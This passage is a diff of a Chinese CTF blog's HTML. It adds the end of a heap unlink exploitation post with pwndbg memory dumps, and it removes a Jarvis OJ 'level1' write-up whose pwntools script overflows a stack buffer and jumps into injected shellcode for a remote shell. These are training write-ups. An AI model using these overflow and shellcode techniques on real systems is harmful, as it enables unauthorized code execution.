class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000080</span>  <span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line"><span class="number">0x603130</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt; p chunk0_ptr</span><br><span class="line">$<span class="number">8</span> = (uint64_t *) <span class="number">0x603010</span></span><br><span class="line">然后我们对chunk0_ptr 进行操作，就能得到一个地址写。</span><br><span class="line"></span><br><span class="line">Pwndbg&gt; x/<span class="number">40</span>gx <span class="number">0x603000</span></span><br><span class="line"><span class="number">0x603000</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000091</span></span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x4141414142424242</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603020</span>:   <span class="number">0x0000000000602058</span>  <span class="number">0x00007fffffffe3d0</span></span><br><span class="line"><span class="number">0x603030</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603040</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603050</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603060</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603070</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603080</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603090</span>:   <span class="number">0x0000000000000080</span>  <span class="number">0x0000000000000090</span></span><br><span class="line"><span class="number">0x6030a0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030b0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030c0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030d0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030e0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x6030f0</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603100</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603110</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x603120</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000020ee1</span></span><br><span class="line"><span class="number">0x603130</span>:   <span class="number">0x0000000000000000</span>  <span class="number">0x0000000000000000</span></span><br><span class="line">Pwndbg&gt; x/gx chunk0_ptr</span><br><span class="line"><span class="number">0x603010</span>:   <span class="number">0x4141414142424242</span></span><br><span class="line">Pwndbg&gt;</span><br><span class="line">总结下，如果我们找到一个全局指针，通过unlink的手段，我们就构造一个chunk指向这个指针所指向的位置，然后通过对chunk的操作来进行读写操作。</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/09/fastbin_dup_consolidate/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1565,151 +1713,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/07/31/level1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="xfgg">
-      <meta itemprop="description" content>
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xfgg">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2019/07/31/level1/" itemprop="url">level1</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-07-31T13:28:39+08:00">
-                2019-07-31
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/jarvis-OJ/" itemprop="url" rel="index">
-                    <span itemprop="name">jarvis OJ</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h3 id="0x01-寻找漏洞"><a href="#0x01-寻找漏洞" class="headerlink" title="0x01 寻找漏洞"></a>0x01 寻找漏洞</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">xfgg@ubuntu:~/Documents$ file level1.80eacdcd51aca92af7749d96efad7fb5 </span><br><span class="line">level1.80eacdcd51aca92af7749d96efad7fb5: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=7d479bd8046d018bbb3829ab97f6196c0238b344, not stripped</span><br><span class="line">xfgg@ubuntu:~/Documents$ checksec level1.80eacdcd51aca92af7749d96efad7fb5</span><br><span class="line">[*] <span class="string">'/home/xfgg/Documents/level1.80eacdcd51aca92af7749d96efad7fb5'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br><span class="line">什么保护都没开！！！</span><br><span class="line"></span><br><span class="line">ida分析</span><br><span class="line"></span><br><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, <span class="string">"Hello, World!\n"</span>, 0xEu);</span><br><span class="line">  <span class="built_in">return</span> 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"What's this:%p?\n"</span>, &amp;buf);</span><br><span class="line">  <span class="built_in">return</span> <span class="built_in">read</span>(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<h3 id="0x02-思路分析"><a href="#0x02-思路分析" class="headerlink" title="0x02 思路分析"></a>0x02 思路分析</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">一开始以为是write函数无libc泄露</span><br><span class="line">发现没有system做不下去了 没开保护 写入shellcode</span><br></pre></td></tr></table></figure>
-
-<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from pwn import * </span><br><span class="line">p=remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9877"</span>)</span><br><span class="line">shellcode_addr=p.recvuntil(<span class="string">'?'</span>,drop=True)</span><br><span class="line">shellcode_addr=int(shellcode_addr[12:],16)</span><br><span class="line">pad=0x88</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">payload=shellcode.ljust(pad,<span class="string">'A'</span>)+<span class="string">"BBBB"</span>+p32(shellcode_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive();</span><br></pre></td></tr></table></figure>
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1760,7 +1763,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">31</span>
+                  <span class="site-state-item-count">32</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
